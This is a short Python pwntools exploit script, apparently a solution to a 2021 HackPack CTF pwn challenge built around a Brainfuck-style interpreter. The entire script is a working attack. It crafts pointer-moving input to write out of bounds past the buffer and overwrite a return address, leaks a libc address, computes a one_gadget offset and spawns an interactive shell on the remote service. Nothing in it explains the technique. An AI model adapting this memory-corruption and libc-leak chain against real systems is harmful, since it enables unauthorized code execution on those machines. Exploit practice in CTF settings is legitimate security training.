from pwn import *
import sys

BASE_INP = ">" * 0x1018
r = remote("ctf2021.hackpack.club", 10996)

def write_dw(data, inp_, orig, p=False):
    print("+++", data, orig)
    assert len(data) == 8
    inp = ""
    for byte, b2 in zip(data, orig):
        if p: inp += '.'
        if(byte > b2):
            inp += "+" * (byte - b2)
        else:
            inp += "-" * (b2 - byte)
        inp += ">"
    print(inp)
    return inp_ + inp

# At rsp lsb, set up rop...
inp = BASE_INP

inp = write_dw(p64(0x401584), inp, p64(0x40159f))
inp += ">" * 24
inp += ".>" * 8

r.sendlineafter(": ", str(len(inp)+1))
r.sendlineafter(":\n", inp)
libc_leak = u64(r.recv(8))
one_gadget = libc_leak - 0x02409b + 0x4484f
log.success("Libc @ %s" % hex(libc_leak - 0x02409b))

inp = "<" * 40
inp = write_dw(p64(one_gadget), inp, p64(0x40159f), True)

r.sendlineafter(": ", str(len(inp)+1))
r.sendlineafter(":\n", inp)
r.interactive()
